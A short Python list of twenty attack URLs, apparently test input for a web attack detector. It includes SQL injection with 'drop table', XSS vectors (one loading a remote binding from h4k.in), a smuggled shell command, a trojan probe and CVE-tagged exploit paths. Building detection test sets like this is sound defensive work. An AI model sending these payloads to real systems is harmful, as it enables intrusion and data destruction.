
# num=20
attack_url_list = ['/stacked?a = 1; drop table b;',                     # SBD SQL
                   '/embedded?a = 1 and (select * from b where 1=1)',
                   '/arithmetic?a = 1*1*1*1',
                   '/sqlfunction?a = MOD(x,y)',
                   '/lineComments',
                   '/tag?a=<input onfocus=write(1) autofocus>',         # SBD XSS
                   '/attribute?id=1 onload="alert(0)"',
                   '/css?a="style=-moz-binding:url(http://h4k.in/mozxss.xml#xss); a="',
                   '/jsfunction?a=function test(){A=alert;A(1)}',
                   '/jsVariable',
                   '/generic.php?path=%3Bcc%20evil.c',                  # Generic Attacks
                   '/trojans/root.exe?/c+dir',                          # Trojans
                   '/CVE-2013-1814/app/api/rpc/users/get?offset=3DOFFSET',  # Known Exploits
                   '/CVE-2012-1823/a.php?-dallow_url_include%3dOn+-dauto_prepend_file',
                   '/CVE-2009-2762/wp-login.php?action=rp&key[]=',
                   '/CVE-2009-4670/rp_1.6/rp_1.6/admin/delitem.php?user=abc',
                   '/CVE-2008-6869/config/oramon.ini',
                   '/CVE-2008-6955/archive/config.ini',
                   '/CVE-2006-1718/clevercopy_path/admin/connect.inc',
                   '/CVE-2000-0302/null.htw?CiWebHitsFile=vuln.asp%20']
